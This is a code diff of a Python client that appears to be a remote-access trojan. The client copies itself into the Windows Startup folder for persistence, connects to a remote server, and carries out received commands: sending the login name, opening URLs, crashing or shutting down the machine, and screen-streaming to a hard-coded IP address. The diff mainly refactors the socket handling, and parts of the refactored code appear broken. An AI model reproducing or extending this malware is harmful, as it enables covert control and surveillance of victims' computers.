@@ -13,7 +13,6 @@ keepgoing = True
 
 try:
     source = os.getcwd() + "\\client.exe"
-    print(source)
     username = os.getlogin()
     destination = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\new.exe"
     shutil.copyfile(source, destination)
@@ -21,23 +20,19 @@ except:
     print("nope")
 
 
-
 while (keepgoing == True):
     try:
-        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        address = (ip,port)
-        sock.connect(address)
-        msg = sock.recv(1024)
-        msg = msg.decode()
+        sock = connect()
         while keepgoing == True:
+            msg = recv()
             if msg == "exit":
                 exit()
             elif msg == "username":
-                username()
+                username(sock)
             elif msg == "screenshare":
                 screenshare()
             elif msg == "website":
-                website()
+                website(sock)
             elif msg == "crash":
                 crash()
             elif msg == "shutdown":
@@ -51,25 +46,38 @@ while (keepgoing == True):
         traceback.print_exc()
         continue
 
+def connect():
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    address = (ip,port)
+    sock.connect(address)
+    return sock
+
+
+def recv():
+    msg = sock.recv(1024)
+    msg = msg.decode()
+    return msg
+
 def exit():
     keepgoing = False
 
 
-def username():
+def username(sock):
     username = os.getlogin()
     sock.send(username.encode())
 
 
 def screenshare():
-    sock.close()
+    return
+    """sock.close()
     sender = ScreenShareClient("77.250.137.62", 8080)
     t = threading.Thread(target=sender.start_stream)
     t.start()
     time.sleep(10)
-    sender.stop_stream()
+    sender.stop_stream()"""
 
 
-def website():
+def website(sock):
     website = sock.recv(1024)
     website = website.decode()
     webbrowser.open(website, new=1)
